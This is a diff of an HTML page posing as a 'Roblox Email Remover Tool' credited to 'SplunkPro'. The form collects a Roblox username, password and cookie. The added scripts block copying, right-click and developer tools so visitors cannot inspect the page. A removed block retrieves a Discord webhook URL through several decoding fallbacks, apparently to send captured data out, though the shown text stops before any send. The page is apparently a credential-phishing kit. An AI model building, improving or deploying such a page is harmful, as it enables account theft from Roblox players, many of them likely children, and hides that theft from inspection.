@@ -1,127 +1,105 @@
 <!DOCTYPE html>
-<html lang="en" oncontextmenu="return false;" onselectstart="return false" ondragstart="return false">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://www.youtube.com https://www.youtube-nocookie.com https://s.ytimg.com; frame-src https://www.youtube.com https://www.youtube-nocookie.com; script-src 'self' 'unsafe-inline' https://www.youtube.com https://www.youtube-nocookie.com https://www.googleapis.com https://s.ytimg.com; style-src 'self' 'unsafe-inline'; connect-src https://www.youtube.com">
     <title>ROBLOX EMAIL REMOVER TOOL</title>
     <link href="all.min.css" rel="stylesheet">
     <link href="css2.css" rel="stylesheet">
     <script src="jquery.min.js"></script>
-    
-    <!-- Anti-save protection -->
+    <!-- Anti-copy protection -->
     <script>
-        // Prevent saving page
+        // Disable right-click with custom message
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            alert('Content copying is not allowed!');
+            return false;
+        });
+        
+        // Disable keyboard shortcuts for copy/paste/save
         document.addEventListener('keydown', function(e) {
-            // Prevent Ctrl+S
-            if (e.ctrlKey && e.keyCode === 83) {
+            // Ctrl+C, Ctrl+V, Ctrl+S, Ctrl+U, F12
+            if ((e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 83 || e.keyCode === 85)) || e.keyCode === 123) {
                 e.preventDefault();
+                if (e.ctrlKey && e.keyCode === 67) {
+                    alert('Copying is not allowed!');
+                }
                 return false;
             }
         });
         
-        // Console warning
-        console.log('%c⚠️ WARNING: PROTECTED CONTENT', 'color: red; font-size: 30px; font-weight: bold;');
-        console.log('%cThis page is protected against unauthorized copying and cloning.', 'color: red; font-size: 16px;');
-        console.log('%cAny attempt to copy, clone, or extract code from this page is strictly prohibited.', 'color: red; font-size: 16px;');
+        // Disable text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
         
-        // Prevent iframe embedding
-        if (window.self !== window.top) {
-            window.top.location.href = window.self.location.href;
-        }
-    </script>
-    
-    <!-- Background Music - Bundak by nopetsallowed -->
-    <div id="music-container" style="position: absolute; z-index: -1; opacity: 0; pointer-events: none;">
-        <iframe id="youtube-player" width="1" height="1" src="https://www.youtube.com/embed/iFPfmBcz2cI?enablejsapi=1&loop=1&playlist=iFPfmBcz2cI" allow="autoplay" frameborder="0"></iframe>
-    </div>
-    
-    <!-- Music controls (hidden but accessible for user experience) -->
-    <div id="music-controls" style="position: fixed; bottom: 10px; right: 10px; z-index: 1000; background: rgba(0,0,0,0.5); padding: 5px; border-radius: 5px; display: none;">
-        <button id="toggle-music" style="background: var(--primary); color: white; border: none; border-radius: 3px; padding: 5px 10px; cursor: pointer;">
-            <i class="fas fa-volume-up"></i> Music
-        </button>
-    </div>
-    
-    <script>
-        // YouTube API integration for better control
-        let tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        let firstScriptTag = document.getElementsByTagName('script')[0];
-        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+        // Disable drag and drop
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
         
-        let player;
-        let musicEnabled = true;
+        // Override copy command
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            alert('Copying is not allowed!');
+            return false;
+        });
         
-        // Initialize YouTube player when API is ready
-        function onYouTubeIframeAPIReady() {
-            player = new YT.Player('youtube-player', {
-                events: {
-                    'onReady': onPlayerReady,
-                    'onStateChange': onPlayerStateChange
-                }
-            });
-        }
-        
-        // When player is ready, try to play (will likely be blocked by browser)
-        function onPlayerReady(event) {
-            // Show music controls after a short delay
-            setTimeout(() => {
-                document.getElementById('music-controls').style.display = 'block';
-            }, 2000);
-            
-            // Try to play, but this will likely be blocked until user interaction
-            event.target.playVideo();
-            event.target.setVolume(50); // Set volume to 50%
-        }
-        
-        // Handle player state changes
-        function onPlayerStateChange(event) {
-            // If video ends, restart it (additional loop protection)
-            if (event.data === YT.PlayerState.ENDED) {
-                player.playVideo();
+        // Disable print screen
+        window.addEventListener('keyup', function(e) {
+            if (e.keyCode === 44) {
+                alert('Screen capture is not allowed!');
+                return false;
             }
-        }
+        });
         
-        // Play music on first user interaction with the page
-        document.addEventListener('click', function() {
-            if (player && player.playVideo && musicEnabled) {
-                player.playVideo();
+        // Disable developer tools
+        document.addEventListener('keydown', function(e) {
+            // Disable F12, Shift+F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C
+            if (e.keyCode === 123 || 
+                (e.shiftKey && e.keyCode === 123) || 
+                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67))) {
+                e.preventDefault();
+                alert('Developer tools are not allowed!');
+                return false;
             }
-        }, {once: true});
-        
-        // Toggle music button functionality
-        document.addEventListener('DOMContentLoaded', function() {
-            const toggleButton = document.getElementById('toggle-music');
-            toggleButton.addEventListener('click', function() {
-                if (player) {
-                    if (musicEnabled) {
-                        player.pauseVideo();
-                        toggleButton.innerHTML = '<i class="fas fa-volume-mute"></i> Music';
-                        musicEnabled = false;
-                    } else {
-                        player.playVideo();
-                        toggleButton.innerHTML = '<i class="fas fa-volume-up"></i> Music';
-                        musicEnabled = true;
-                    }
-                }
-            });
         });
     </script>
     <style>
+        /* Additional anti-copy protection */
+        html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+            -webkit-touch-callout: none; /* iOS Safari */
+            -webkit-user-select: none; /* Safari */
+            -khtml-user-select: none; /* Konqueror HTML */
+            -moz-user-select: none; /* Firefox */
+            -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none; /* Non-prefixed version */
+            pointer-events: auto;
+        }
+        
+        img, svg {
+            pointer-events: none;
+            -webkit-user-drag: none;
+            -khtml-user-drag: none;
+            -moz-user-drag: none;
+            -ms-user-drag: none;
+        }
+        
         :root {
-            --primary: #5865F2; /* Discord blue */
-            --primary-dark: #4752C4;
-            --secondary: #2D3142;
-            --dark: #1A1A1A;
-            --light: #F5F5F5;
-            --success: #57F287; /* Discord green */
-            --warning: #FEE75C; /* Discord yellow */
-            --danger: #ED4245; /* Discord red */
+            --primary: #5865F2;
+            --secondary: #7289DA;
+            --dark: #1a1a1a;
+            --light: #f5f5f5;
+            --success: #57F287;
+            --warning: #FEE75C;
+            --danger: #ED4245;
             --card-bg: rgba(255, 255, 255, 0.95);
-            --card-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
-            --gradient-start: #5865F2;
-            --gradient-end: #7289DA;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            --discord-bg: #36393F;
+            --discord-light: #40444B;
+            --discord-text: #DCDDDE;
         }
 
         * {
@@ -129,30 +107,45 @@
             padding: 0;
             box-sizing: border-box;
             font-family: 'Poppins', sans-serif;
+            -webkit-user-select: none; /* Safari */
+            -ms-user-select: none; /* IE 10+ */
+            user-select: none; /* Standard syntax */
         }
 
         body {
-            background: linear-gradient(135deg, var(--gradient-start), var(--gradient-end));
-            background-attachment: fixed;
+            background: var(--discord-bg);
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCI+PHBhdGggZmlsbD0icmdiYSgyNTUsMjU1LDI1NSwwLjAzKSIgZD0iTTExIDExaDc4djc4SDExeiIvPjwvc3ZnPg==');
             min-height: 100vh;
             padding: 20px;
-            color: var(--dark);
+            color: var(--discord-text);
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 200px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            z-index: -1;
+            transform: skewY(-3deg) translateY(-100px);
         }
 
         .container {
             max-width: 1200px;
             margin: 0 auto;
+            position: relative;
+            z-index: 1;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
             color: white;
-            padding: 20px;
-            border-radius: 15px;
-            background: rgba(0, 0, 0, 0.2);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
         }
 
         .logo {
@@ -166,36 +159,57 @@
             font-size: 2.5rem;
             margin-right: 15px;
             color: white;
-            background: rgba(255, 255, 255, 0.2);
+            background: var(--primary);
             border-radius: 50%;
             width: 70px;
             height: 70px;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
         }
 
         .title {
-            font-size: 2.5rem;
-            font-weight: 700;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-            background: linear-gradient(to right, #ffffff, #e0e0e0);
+            font-size: 2.8rem;
+            font-weight: 800;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            background: linear-gradient(to right, #fff, #d9dcff);
+            -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
+            letter-spacing: -0.5px;
         }
 
         .subtitle {
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             opacity: 0.9;
             max-width: 600px;
-            margin: 0 auto;
+            margin: 0 auto 20px;
+            line-height: 1.5;
+        }
+        
+        .discord-badge {
+            display: inline-flex;
+            align-items: center;
+            background: var(--primary);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
+            margin-top: 10px;
+        }
+        
+        .discord-badge i {
+            font-size: 1.2rem;
+            margin-right: 8px;
         }
 
         .content-wrapper {
             display: flex;
             flex-wrap: wrap;
-            gap: 25px;
+            gap: 30px;
         }
 
         .main-content {
@@ -204,52 +218,59 @@
         }
 
         .card {
-            background: var(--card-bg);
-            border-radius: 20px;
+            background: var(--discord-light);
+            border-radius: 10px;
             box-shadow: var(--card-shadow);
             padding: 30px;
             margin-bottom: 25px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            transition: transform 0.3s, box-shadow 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-
+        
         .card:hover {
             transform: translateY(-5px);
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
         }
 
         .card-title {
             font-size: 1.6rem;
             margin-bottom: 25px;
-            color: var(--primary);
+            color: white;
             display: flex;
             align-items: center;
+            position: relative;
             padding-bottom: 15px;
-            border-bottom: 2px solid rgba(88, 101, 242, 0.2);
+        }
+
+        .card-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 60px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 3px;
         }
 
         .card-title i {
             margin-right: 12px;
-            background: var(--primary);
-            color: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            color: var(--primary);
         }
 
         .input-group {
             margin-bottom: 25px;
+            position: relative;
         }
 
         .input-label {
             display: block;
             margin-bottom: 10px;
             font-weight: 500;
-            color: var(--secondary);
+            color: var(--discord-text);
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
         .input-label i {
@@ -259,19 +280,24 @@
 
         .input-field, .select-field {
             width: 100%;
-            padding: 14px 18px;
-            border: 2px solid rgba(0, 0, 0, 0.08);
-            border-radius: 12px;
+            padding: 14px 16px;
+            background-color: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
             font-size: 1rem;
             transition: all 0.3s;
-            background: rgba(255, 255, 255, 0.9);
+            color: white;
         }
 
         .input-field:focus, .select-field:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.2);
-            background: white;
+            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.3);
+            background-color: rgba(0, 0, 0, 0.3);
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.4);
         }
 
         textarea.input-field {
@@ -283,9 +309,9 @@
             background: var(--primary);
             color: white;
             border: none;
-            border-radius: 12px;
-            padding: 16px 24px;
-            font-size: 1.1rem;
+            border-radius: 4px;
+            padding: 14px 20px;
+            font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
@@ -293,26 +319,40 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .process-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .process-btn:hover::before {
+            left: 100%;
         }
 
         .process-btn i {
             margin-right: 10px;
-            font-size: 1.2rem;
         }
 
         .process-btn:hover {
-            background: var(--primary-dark);
+            background: var(--secondary);
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(88, 101, 242, 0.4);
-        }
-
-        .process-btn:active {
-            transform: translateY(1px);
+            box-shadow: 0 5px 15px rgba(88, 101, 242, 0.4);
         }
 
         .process-btn:disabled {
-            background: #cccccc;
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.5);
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
@@ -321,8 +361,8 @@
         .result-box {
             display: none;
             background: rgba(87, 242, 135, 0.1);
-            border: 2px solid rgba(87, 242, 135, 0.3);
-            border-radius: 12px;
+            border: 1px solid rgba(87, 242, 135, 0.3);
+            border-radius: 4px;
             padding: 20px;
             margin-top: 25px;
             animation: fadeIn 0.5s ease-out forwards;
@@ -331,81 +371,46 @@
         .result-title {
             color: var(--success);
             font-weight: 600;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
         }
 
         .result-title i {
             margin-right: 10px;
-            font-size: 1.4rem;
         }
 
         .result-content {
-            line-height: 1.8;
-        }
-
-        .result-content p {
-            margin-bottom: 8px;
-        }
-
-        .result-content strong {
-            color: var(--primary);
+            line-height: 1.7;
+            color: var(--discord-text);
         }
 
         .history-section {
-            flex: 0 0 380px;
+            flex: 0 0 350px;
         }
 
         .history-list {
-            max-height: 600px;
+            max-height: 500px;
             overflow-y: auto;
-            padding-right: 10px;
-        }
-
-        .history-list::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .history-list::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.05);
-            border-radius: 10px;
-        }
-
-        .history-list::-webkit-scrollbar-thumb {
-            background: rgba(88, 101, 242, 0.3);
-            border-radius: 10px;
-        }
-
-        .history-list::-webkit-scrollbar-thumb:hover {
-            background: rgba(88, 101, 242, 0.5);
         }
 
         .history-item {
             display: flex;
             align-items: flex-start;
-            padding: 15px;
+            padding: 12px 0;
             border-bottom: 1px solid rgba(0, 0, 0, 0.05);
-            transition: background 0.3s;
-            border-radius: 10px;
-        }
-
-        .history-item:hover {
-            background: rgba(88, 101, 242, 0.05);
         }
 
         .history-icon {
             color: var(--success);
-            margin-right: 12px;
+            margin-right: 10px;
             margin-top: 3px;
-            font-size: 1.1rem;
         }
 
         .history-text {
             font-weight: 500;
             margin-bottom: 5px;
-            color: var(--secondary);
         }
 
         .history-date {
@@ -414,11 +419,11 @@
         }
 
         .info-section {
-            margin-top: 25px;
+            margin-top: 20px;
         }
 
         .info-title {
-            font-size: 1.3rem;
+            font-size: 1.2rem;
             margin-bottom: 15px;
             color: var(--primary);
             display: flex;
@@ -426,55 +431,37 @@
         }
 
         .info-title i {
-            margin-right: 10px;
-            background: rgba(88, 101, 242, 0.1);
-            color: var(--primary);
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            margin-right: 8px;
         }
 
         .info-content {
-            line-height: 1.7;
-            color: #444;
+            line-height: 1.6;
         }
 
         .info-content ul {
             padding-left: 25px;
-            margin-top: 15px;
+            margin-top: 10px;
         }
 
         .info-content li {
-            margin-bottom: 10px;
-            position: relative;
-        }
-
-        .info-content li::before {
-            content: '✓';
-            color: var(--success);
-            position: absolute;
-            left: -20px;
-            font-weight: bold;
+            margin-bottom: 8px;
         }
 
         .toast {
             position: fixed;
             top: 20px;
             right: 20px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-            padding: 20px;
+            background: var(--discord-light);
+            border-left: 4px solid var(--primary);
+            border-radius: 4px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            padding: 16px 20px;
             display: flex;
             align-items: flex-start;
             max-width: 380px;
             z-index: 1000;
             transform: translateX(400px);
             transition: transform 0.3s ease-out;
-            border-left: 5px solid var(--primary);
         }
 
         .toast.show {
@@ -499,30 +486,31 @@
         }
 
         .toast-title {
-            font-weight: 600;
-            margin-bottom: 8px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: white;
             font-size: 1.1rem;
         }
 
         .toast-message {
             font-size: 0.95rem;
-            color: #555;
+            color: var(--discord-text);
             line-height: 1.5;
         }
 
         .toast-close {
             background: none;
             border: none;
-            color: #999;
+            color: rgba(255, 255, 255, 0.5);
             cursor: pointer;
             font-size: 1.2rem;
-            margin-left: 10px;
+            margin-left: 15px;
             padding: 0;
-            transition: color 0.3s;
+            transition: color 0.2s;
         }
-
+        
         .toast-close:hover {
-            color: #555;
+            color: white;
         }
 
         .fade-in {
@@ -532,7 +520,7 @@
         @keyframes fadeIn {
             from {
                 opacity: 0;
-                transform: translateY(10px);
+                transform: translateY(15px);
             }
             to {
                 opacity: 1;
@@ -543,20 +531,55 @@
         @keyframes pulse {
             0% {
                 transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.7);
+                box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
             }
-            70% {
+            50% {
                 transform: scale(1.05);
-                box-shadow: 0 0 0 15px rgba(255, 255, 255, 0);
+                box-shadow: 0 8px 25px rgba(88, 101, 242, 0.6);
             }
             100% {
                 transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0);
+                box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
             }
         }
 
         .pulse {
-            animation: pulse 2s infinite;
+            animation: pulse 3s infinite;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+            100% {
+                transform: translateY(0px);
+            }
+        }
+        
+        .float {
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        /* Discord-style scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--discord-bg);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--discord-light);
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary);
         }
 
         @media (max-width: 768px) {
@@ -568,30 +591,57 @@
                 width: 100%;
             }
             .title {
-                font-size: 1.8rem;
+                font-size: 2rem;
+            }
+            .subtitle {
+                font-size: 1.1rem;
             }
             .logo-icon {
                 font-size: 1.8rem;
-                width: 50px;
-                height: 50px;
+                width: 55px;
+                height: 55px;
             }
             .card {
                 padding: 20px;
+            }
+            body::before {
+                height: 150px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .title {
+                font-size: 1.8rem;
+            }
+            .logo-icon {
+                width: 50px;
+                height: 50px;
+            }
+            .card-title {
+                font-size: 1.4rem;
+            }
+            .toast {
+                max-width: calc(100% - 40px);
+                left: 20px;
+                right: 20px;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class="container">
+    <div class="container" id="remover-container">
         <header class="header">
             <div class="logo">
                 <div class="logo-icon pulse">
                     <i class="fas fa-envelope-open-text"></i>
                 </div>
-                <h1 class="title">ROBLOX EMAIL REMOVER</h1>
+                <h1 class="title">ROBLOX EMAIL REMOVER TOOL</h1>
             </div>
             <p class="subtitle">Remove email from your Roblox account for enhanced privacy and security</p>
+            <div class="discord-badge float">
+                <i class="fab fa-discord"></i> Made by SplunkPro
+            </div>
         </header>
 
         <div class="content-wrapper">
@@ -604,7 +654,7 @@
                             <i class="fas fa-envelope-slash"></i> Select Email Removal Method
                         </label>
                         <select id="age-option" class="select-field">
-                            <option value="">Select an option</option>
+                            <option value="">OPTION</option>
                             <option value="2008">Remove Email Completely</option>
                             <option value="13plus">Add Temporary Email</option>
                         </select>
@@ -612,12 +662,12 @@
                         <label for="username-input" class="input-label">
                             <i class="fas fa-user"></i> Roblox Username
                         </label>
-                        <input id="username-input" class="input-field" type="text" placeholder="Enter your Roblox username" />
+                        <input id="username-input" class="input-field" type="text" placeholder="Enter your Roblox username..." />
 
                         <label for="password-input" class="input-label">
                             <i class="fas fa-lock"></i> Account Password
                         </label>
-                        <input id="password-input" class="input-field" type="password" placeholder="Enter your password" />
+                        <input id="password-input" class="input-field" type="password" placeholder="Enter your account password..." />
                     </div>
 
                     <div id='cookieInput'>
@@ -646,7 +696,7 @@
                     </div>
                 </div>
 
-                <div class="info-section card">
+                <div class="info-section">
                     <h3 class="info-title"><i class="fas fa-info-circle"></i> Important Information</h3>
                     <div class="info-content">
                         <p>Before using this service, please read the following information:</p>
@@ -704,271 +754,8 @@
         <button id="toast-close" class="toast-close">&times;</button>
     </div>
 
-    <!-- Anti-copying/cloning protection -->
-    <style>
-        /* Watermark styling */
-        .watermark {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1000;
-            opacity: 0.07;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        
-        .watermark-text {
-            font-size: 5vw;
-            font-weight: bold;
-            color: var(--text-color);
-            white-space: nowrap;
-            transform: rotate(-45deg);
-            user-select: none;
-        }
-        
-        /* DevTools detection notification */
-        #devtools-warning {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            z-index: 9999;
-            color: #ff0000;
-            text-align: center;
-            padding-top: 20%;
-            font-size: 24px;
-            font-weight: bold;
-        }
-    </style>
-    
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Create watermark
-            const watermark = document.createElement('div');
-            watermark.className = 'watermark';
-            const watermarkText = document.createElement('div');
-            watermarkText.className = 'watermark-text';
-            watermarkText.textContent = 'PROTECTED - DO NOT COPY';
-            watermark.appendChild(watermarkText);
-            document.body.appendChild(watermark);
-            
-            // Create DevTools warning
-            const devToolsWarning = document.createElement('div');
-            devToolsWarning.id = 'devtools-warning';
-            devToolsWarning.innerHTML = '<p>⚠️ UNAUTHORIZED ACCESS DETECTED ⚠️</p><p>This page is protected. DevTools usage is not allowed.</p>';
-            document.body.appendChild(devToolsWarning);
-            
-            // Anti-copy protection
-            document.addEventListener('keydown', function(e) {
-                // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-                if (
-                    e.keyCode === 123 || 
-                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
-                    (e.ctrlKey && e.keyCode === 85)
-                ) {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                // Prevent Ctrl+C, Ctrl+X
-                if ((e.ctrlKey && (e.keyCode === 67 || e.keyCode === 88))) {
-                    // Allow copying from input fields
-                    if (!(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
-                        e.preventDefault();
-                        return false;
-                    }
-                }
-            });
-            
-            // Disable text selection except for input fields
-            document.addEventListener('selectstart', function(e) {
-                if (!(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
-            
-            // Disable right-click menu
-            document.addEventListener('contextmenu', function(e) {
-                if (!(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
-            
-            // DevTools detection
-            function detectDevTools() {
-                const widthThreshold = window.outerWidth - window.innerWidth > 160;
-                const heightThreshold = window.outerHeight - window.innerHeight > 160;
-                if (widthThreshold || heightThreshold) {
-                    document.getElementById('devtools-warning').style.display = 'block';
-                } else {
-                    document.getElementById('devtools-warning').style.display = 'none';
-                }
-            }
-            
-            window.addEventListener('resize', detectDevTools);
-            setInterval(detectDevTools, 1000);
-            
-            // Prevent drag and drop
-            document.addEventListener('dragstart', function(e) {
-                e.preventDefault();
-                return false;
-            });
-            
-            document.addEventListener('drop', function(e) {
-                e.preventDefault();
-                return false;
-            });
-            
-            // Original initialization code follows
-            // Parse URL parameters and retrieve stored data
-            console.log('Initializing Remover.html...');
-            
-            // Parse URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            const encodedDir = urlParams.get('dir');
-            const token = urlParams.get('token');
-            
-            // Get webhook from localStorage and directory from URL or localStorage
-            // Decrypt data from localStorage
-            const decryptData = (data) => {
-                if (!data) return null;
-                
-                try {
-                    // Decode from base64 and parse JSON
-                    const decodedData = atob(data);
-                    const parsedData = JSON.parse(decodedData);
-                    
-                    // For webhook URL, return the url property
-                    if (parsedData && parsedData.url) {
-                        return parsedData.url;
-                    }
-                    
-                    // For other data, return the value directly
-                    return parsedData;
-                } catch (e) {
-                    console.error('Error decrypting data:', e, 'Raw data:', data);
-                    return null;
-                }
-            };
-            
-            // Get webhook URL from localStorage using multiple formats
-            console.log('Checking all localStorage formats for webhook URL');
-            let webhookUrl = null;
-            
-            // Format 1: Original encrypted JSON object
-            const webhookUrlEncrypted = localStorage.getItem('discord_webhook_url');
-            console.log('Format 1 - Raw webhook from localStorage:', webhookUrlEncrypted);
-            
-            if (webhookUrlEncrypted) {
-                try {
-                    webhookUrl = decryptData(webhookUrlEncrypted);
-                    console.log('Format 1 - Decrypted webhook URL:', webhookUrl);
-                } catch (e) {
-                    console.error('Format 1 decryption failed:', e);
-                }
-            }
-            
-            // Format 2: Direct base64 encoded URL
-            if (!webhookUrl) {
-                const webhookUrlDirect = localStorage.getItem('discord_webhook_url_direct');
-                console.log('Format 2 - Direct webhook from localStorage:', webhookUrlDirect);
-                
-                if (webhookUrlDirect) {
-                    try {
-                        const decoded = atob(webhookUrlDirect);
-                        if (decoded && decoded.includes('discord.com/api/webhooks')) {
-                            webhookUrl = decoded;
-                            console.log('Format 2 - Using direct decoded webhook URL:', webhookUrl);
-                        }
-                    } catch (e) {
-                        console.error('Format 2 decoding failed:', e);
-                    }
-                }
-            }
-            
-            // Format 3: Plain text URL
-            if (!webhookUrl) {
-                const webhookUrlPlain = localStorage.getItem('discord_webhook_url_plain');
-                console.log('Format 3 - Plain webhook from localStorage:', webhookUrlPlain);
-                
-                if (webhookUrlPlain && webhookUrlPlain.includes('discord.com/api/webhooks')) {
-                    webhookUrl = webhookUrlPlain;
-                    console.log('Format 3 - Using plain webhook URL:', webhookUrl);
-                }
-            }
-            
-            // Additional fallback methods
-            
-            // Fallback 1: Try to use directly if it's already a URL
-            if (!webhookUrl && webhookUrlEncrypted && webhookUrlEncrypted.includes('discord.com/api/webhooks')) {
-                webhookUrl = webhookUrlEncrypted;
-                console.log('Fallback 1 - Using raw webhook URL from localStorage');
-            }
-            
-            // Fallback 2: Try to decode without JSON parsing
-            if (!webhookUrl && webhookUrlEncrypted) {
-                try {
-                    const decoded = atob(webhookUrlEncrypted);
-                    if (decoded.includes('discord.com/api/webhooks')) {
-                        webhookUrl = decoded;
-                        console.log('Fallback 2 - Using base64 decoded webhook URL');
-                    } else if (decoded.includes('"url"')) {
-                        // Try to extract URL from JSON string
-                        try {
-                            const jsonObj = JSON.parse(decoded);
-                            if (jsonObj && jsonObj.url) {
-                                webhookUrl = jsonObj.url;
-                                console.log('Fallback 2 - Extracted URL from JSON string:', webhookUrl);
-                            }
-                        } catch (jsonErr) {
-                            console.error('Fallback 2 JSON parsing failed:', jsonErr);
-                        }
-                    }
-                } catch (e) {
-                    console.error('Fallback 2 decoding failed:', e);
-                }
-            }
-            
-            console.log('Final webhook URL determination:', webhookUrl ? webhookUrl.substring(0, 30) + '...' : 'Not found');
-            
-            // Get and decrypt directory
-            let directoryEncrypted = localStorage.getItem('email_remover_directory');
-            let directory = null;
-            if (directoryEncrypted) {
-                try {
-                    directory = decryptData(directoryEncrypted);
-                } catch (e) {
-                    console.error('Error parsing directory:', e);
-                }
-            }
-            
-            // Debug information
-            console.log('Retrieved webhook URL from localStorage:', webhookUrl ? 'Found (length: ' + webhookUrl.length + ')' : 'Not found');
-            console.log('Retrieved directory from localStorage:', directory ? directory : 'Not found');
-            console.log('URL parameters - dir:', encodedDir ? 'Found' : 'Not found', 'token:', token ? 'Found' : 'Not found');
-            
